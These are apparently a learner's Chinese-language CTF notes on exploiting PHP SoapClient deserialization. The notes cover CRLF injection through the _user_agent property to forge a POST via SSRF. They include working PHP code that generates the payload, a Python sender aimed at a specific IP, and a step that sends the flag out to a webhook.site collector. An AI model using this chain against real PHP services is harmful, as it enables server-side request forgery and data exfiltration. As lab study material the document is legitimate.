## 二、知识点

### 1. 序列化格式是怎么拼出来的

```
O : 10 : "SoapClient" : 3 : {                     ← 对象头
    s : 11 : "_user_agent" ; s : 183 : "值" ;     ← 属性：名长 + 名 + 值长 + 值
    s : 8  : "location"    ; s : 25  : "值" ;
    s : 3  : "uri"         ; s : 1   : "x" ;
}                                                 ← 收尾
```

- `O:类名长:"类名":属性个数:{属性们}`，`s:长:"内容"`，`i:数字`
- **多个属性直接连写**，无逗号无空格，每段后面一个分号
- 长度必须**精确**——`unserialize` 是**按长度读**的，不是按引号配对找

**同一份 PHP 代码，不同版本输出完全不同**：

| | 属性名 | 属性个数 | 靶机（PHP 5.5）能用？ |
|---|---|---|---|
| **PHP 5.4** | `_user_agent`（公开） | 4 | ✅ |
| PHP 8.2 | `\0SoapClient\0_user_agent`（私有） | **36** | ❌ |

**结论：生成 payload 必须用和靶机同大版本的 PHP。**

### 2. 两个长度千万别搞混

| 数字 | 是什么 | 范围 |
|---|---|---|
| `s:183:` | **整个注入值**的字节数 | 从 `a` 到 body 结束 |
| `Content-Length: 108` | **只有 body** 的字节数 | 从 `py` 开始到结尾 |

公式：`Content-Length = 12 + len(接收地址)`（`py=flag&url=` 固定 12 字符）

### 3. 属性顺序无所谓

`unserialize` **按名字找属性**，不按位置。手写顺序和 PHP 生成顺序不一样，两者都验证通过。

### 4. 报错要分四层看（省一半时间）

| 层 | 报错 | 含义 |
|---|---|---|
| 反序列化层 | `Call to a member function pyflag() on a non-object` | `unserialize()` 返回 `false`，**payload 没变成对象** |
| SOAP 层 | `looks like we got no XML document` | **请求成功发出去了**，只是响应不是 XML |
| HTTP 层 | `[HTTP] Bad request` / `Not Found` / `Could not connect` | 请求本身有问题 |
| 成功 | **响应 0 字节（完全静默）** | ✅ **攻击成功** |

### 5. ⭐ 响应为空 = 成功（反直觉）

同一靶机、同一注入，只改 body 做了 5 组对照：

| 案例 | body / 目标 | 响应长度 |
|---|---|---|
| A 不注入，打 un92 | — | 336（`no XML document`） |
| **B 注入，打 un92** | `py=flag&url=...` | **0（静默）** |
| B' 注入，打 un92 | `py=no&url=...` | 336 |
| B'' 注入，打 un92 | 空 body | 336 |
| C 注入，打 **webhook** | `py=flag&url=...` | 336 |

- C 证明**注入本身不吞报错**；B'/B'' 证明**多余字节不吞报错**
- 唯一变量是 `py=flag` 触发了 un92 的发 flag 分支
- → **un92 发完 flag 就静默退出（返回 0 字节）**，PHP 的 SOAP 客户端对空响应不抛异常 → un9.php 无输出

### 6. 盲打漏洞必须分级验证

SSRF 看不到回显，**每一步都要有独立的验证点**，否则你不知道是注入没生效还是目标不认。

### 7. `urlencode` 之后绝不能再编码

PHP 端 `urlencode` 把 `\r\n` 变成 `%0D%0A`，payload 变成一行纯 ASCII。Python 端必须**直接拼 URL**：

```python
requests.get("...?tryhackme=" + p)      # ✅
requests.get("...", params={"tryhackme": p})   # ❌ 二次编码，%3A → %253A
```

### 8. 中文 Windows + PHP：源码里不能写中文路径

**字节层因果链**：

```
源码存 UTF-8 → '暗炎魔主' = E6 9A 97 E7 82 8E E9 AD 94 E4 B8 BB
PHP 把字符串当纯字节，不转换
Windows 按系统代码页 GBK 理解 → 鏆楃値榄斾富
'版' = E7 89 88 → 鐗 + 孤零零的 88 → 映射不出 → 变成 ?
文件名含 '?' → Windows 禁用 → CreateFile 失败
```

**四种写法实测**：

| 写法 | 结果 |
|---|---|
| 中文目录 + 英文文件名 | ❌ false（**目录**已经坏了） |
| 全 ASCII 绝对路径 | ✅ |
| 相对路径 | ✅ |
| **`__DIR__ . '/x.txt'`** | ✅ **推荐** |
| 中文字面量文件名 | ⚠️ 返回成功但文件名变成乱码 |

**为什么脚本本身能打开（路径里也有中文）**：脚本路径经 Windows 正规宽字符转换，字节正确；源码字面量是编辑器存的 UTF-8 字节，PHP 原样转交 → 被当 GBK。

**Python 没这个问题**（走 Unicode API）。

### 9. webhook.site 的地址到 token 为止

- 地址栏里的 `.../#!/view/<token>/<请求id>/1` 是**网页查看地址**，`#` 后内容浏览器不发给服务器
- 实测：**token 下的任意子路径也会被记录**，所以抄错了也能收到——但这是侥幸，换接收端就废

## 三、案例 / payload

### 1. 生成端：`un9成品1.php`

```php
<?php
$t = 'http://127.0.0.1/un92.php';
$h = 'https://webhook.site/你的token';
$b = 'py=flag&url=' . $h;

$u = "a\r\n"
   . "Content-Type: application/x-www-form-urlencoded\r\n"
   . "Content-Length: " . strlen($b) . "\r\n"     // 只数 body
   . "\r\n"                                        // 空行 = 头结束
   . $b;

$c = new SoapClient(null, array(
    'location'   => $t,
    'uri'        => 'x',
    'user_agent' => $u        // ⚠️ 构造参数不带下划线，序列化后才是 _user_agent
));

echo serialize($c) . "\n";
file_put_contents(__DIR__ . '/p.txt', urlencode(serialize($c)));   // ⚠️ 不写中文路径
echo "OK -> p.txt\n";
```

### 2. 发送端：`un9成品2.py`

```python
import requests

p = open(r"C:\Users\暗炎魔主\Desktop\p.txt", encoding="utf-8").read().strip()
url = "http://120.76.159.54:8888/un9.php?tryhackme=" + p     # ⚠️ 不能走 params=
r = requests.get(url)
print("status:", r.status_code)
print("len   :", len(r.text))
print(r.text[:300])
```

**运行**：

```powershell

python "C:\Users\暗炎魔主\Desktop\un9成品2.py"
```

### 3. 四个必须想通的问题（题眼）

| 问题 | 答案 |
|---|---|
| `pyflag()` 明明不存在，为什么发请求？ | 触发 `__call`，而 `SoapClient::__call` 的本职就是发 HTTP 请求 |
| 为什么必须 SSRF？ | `REMOTE_ADDR` 是 TCP 层，`X-Forwarded-For` 等全无效 |
| 为什么注入点只能是 `_user_agent`？ | 头顺序：`User-Agent` 在 `Content-Type` **之前**；`uri`→`SOAPAction` 在其**之后** |
| 为什么要抢 `Content-Type`？ | PHP 填不填 `$_POST` **由 Content-Type 决定**，`text/xml` 下 body 塞得再对也不解析 |

### 4. PHP 版本对照实测（同一份源码）

```
PHP 5.4.45 → O:10:"SoapClient":4:{s:3:"uri";s:1:"x";s:8:"location";...;s:11:"_user_agent";...;s:13:"_soap_version";i:1;}
             长度 326，4 个公开属性                              ✅ 靶机可用

PHP 8.2.9  → O:10:"SoapClient":36:{s:15:"\0SoapClient\0uri";s:1:"x";s:17:"\0SoapClient\0style";N;...}
             长度 1461，36 个私有属性                            ❌ 靶机不认
```

## 四、踩坑点

| 问题 | 原因 | 解决 |
|---|---|---|
| **`file_put_contents` 报 `No such file or directory`** | 源码里的中文路径被按 GBK 解读，`版` 变成了非法的 `?` | 用 **`__DIR__ . '/p.txt'`** |
| **`input()` 接 payload 只发出去半截** | 输出里的 `\r\n` 是**真换行**，第一个换行就回车提交了 | 写文件再读（`p.txt`） |
| **`params={"tryhackme": p}` 报 `on a non-object`** | payload 已编码，`params` 又编码一次 | 直接拼 URL 字符串 |
| **探针里裸拼原始 payload → `on a non-object`** | URL 里的裸 CRLF 把请求行截断了 | 先 `urlencode` |
| **用 PATH 里的 `php` 生成 payload** | 那是 **PHP 8.2**，输出 36 个私有属性 | 用**绝对路径**点名 PHP 5.4 |
| **webhook 地址抄成网页地址** | `.../#!/view/<token>/<请求id>/1` 里的 `#` 后内容不发送 | 地址**到 token 为止** |
| **f-string 里的 `{}` 报错** | f-string 中花括号是插值符 | 字面花括号写 `{{` `}}` |

**⭐ 今天最值钱的一条**：**生成 payload 的工具链版本，和被攻击目标的版本必须对齐。** 这个坑不报错、不提示，表现是"什么都对但就是没反应"。
